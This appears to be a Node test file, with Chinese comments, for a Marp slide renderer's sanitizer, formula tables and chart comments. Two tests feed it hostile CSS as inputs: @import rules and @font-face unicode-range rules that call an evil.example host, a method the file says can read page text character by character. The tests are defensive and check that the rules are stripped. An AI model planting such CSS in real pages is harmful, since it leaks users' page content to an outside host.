// 執行：node --test src/slides.test.js
import { test } from "node:test";
import assert from "node:assert/strict";
import { Marp } from "@marp-team/marp-core";
import { loadDiagrams } from "./diagram.js";
import { isSlides, setupMarp, stripFrontMatter, stripImports, SLIDES_TEMPLATE } from "./slides.js";

test("只有 front matter 寫 marp: true 才是簡報", () => {
  assert.equal(isSlides("---\nmarp: true\n---\n# A"), true);
  assert.equal(isSlides("---\ntheme: gaia\nmarp: true\n---"), true);
  assert.equal(isSlides(SLIDES_TEMPLATE), true);
  assert.equal(isSlides("---\nmarp: false\n---"), false);
  assert.equal(isSlides("# A\n---\nmarp: true\n---"), false); // 不在開頭
  assert.equal(isSlides("# 一般文件\n\n---\n\n分隔線"), false);
});

test("去掉 front matter", () => {
  assert.equal(stripFrontMatter("---\nmarp: true\n---\n# A"), "# A");
  assert.equal(stripFrontMatter("# A\n---\nb\n---"), "# A\n---\nb\n---");
});

test("拿掉外部 @import，保留主題字型", () => {
  const font = '@import "https://fonts.bunny.net/css?family=Lato";';
  assert.equal(
    stripImports(`${font}@import url("https://evil.example/x.css");@import 'https://evil.example/y.css';div{}`),
    `${font}  div{}`,
  );
});

test("拿掉 @font-face：unicode-range 可以逐字偷讀頁面上的文字", () => {
  const css = stripImports(
    "@font-face{font-family:Menlo;src:url(https://evil.example/?c=61);unicode-range:U+61}" +
      "@FONT-FACE {src:url(https://evil.example/b)}" +
      "@font@font-face{}-face{src:url(https://evil.example/c)}div{}",
  );
  assert.doesNotMatch(css, /@font-face/i);
  assert.match(css, /div\{\}$/);
});

test("拿掉 @property：會蓋掉 Tailwind 註冊的 --tw-* 變數", () => {
  const css = stripImports(
    '@property --tw-border-style{syntax:"*";inherits:false;initial-value:none}' +
      "@PROPERTY --tw-x {initial-value:1px}div{}",
  );
  assert.doesNotMatch(css, /@property/i);
  assert.match(css, /div\{\}$/);
});

const marp = new Marp({ script: false });
setupMarp(marp);
const TABLE = "| 月份 | 線上 | 門市 |\n|---|---|---|\n| 1月 | 120 | 80.5 |\n| 2月 | 1,085.05 | 95 |\n| 合計 | =SUM(B2:B3) | =C2/3 |";
const slide = (body) => marp.render(`---\nmarp: true\n---\n\n${body}\n`);

test("簡報裡的表格計算公式，格式跟一般模式一樣", () => {
  const { html } = slide(TABLE);
  assert.match(html, /<td>1,205.05<\/td>/);
  assert.match(html, /<td>26.83<\/td>/);
  assert.match(slide("| a |\n|---|\n| \\=B1 |").html, /<td>=B1<\/td>/); // \= 不是公式
});

test("圖表註解：只顯示圖、不進講者備註、不影響 Marp 指令", async () => {
  await loadDiagrams(["xychart-beta\n  bar [1]"]);
  const { html, comments } = slide(`<!-- _class: invert -->\n\n<!-- chart bar B2:C3 -->\n${TABLE}`);
  assert.match(html, /<div class="diagram"><svg /);
  assert.doesNotMatch(html, /<table/);
  assert.match(html, /class="invert"/);
  assert.deepEqual(comments, [[]]);
});

test("註解和表格中間隔空行就不算圖表", () => {
  const { html, comments } = slide(`<!-- chart bar B2:C3 -->\n\n${TABLE}`);
  assert.match(html, /<table/);
  assert.doesNotMatch(html, /class="diagram"/);
  assert.deepEqual(comments, [["chart bar B2:C3"]]); // 一般註解照樣是講者備註
});

test("圖表錯誤顯示訊息，表格不顯示", () => {
  const { html } = slide(`<!-- chart pie B2:C3 -->\n${TABLE}`);
  assert.match(html, /<p class="diagram-error">圓餅圖只能選一欄<\/p>/);
  assert.doesNotMatch(html, /<table/);
});

test("一般模式不認的圖表註解，簡報也不認", () => {
  const indent = (s, p) => p + s.replaceAll("\n", `\n${p}`);
  for (const body of [
    `<!--\nchart bar B2:B3\n-->\n${TABLE}`,
    `<!--- chart bar B2:B3 --->\n${TABLE}`,
    `<!-- chart bar B2:B3 --> 說明\n${TABLE}`,
    indent(`<!-- chart bar B2:B3 -->\n${TABLE}`, "> "),
    `- 項目\n\n${indent(`<!-- chart bar B2:B3 -->\n${TABLE}`, "  ")}`,
  ]) {
    const { html } = slide(body);
    assert.match(html, /<table/, body);
    assert.doesNotMatch(html, /class="diagram/, body);
  }
});
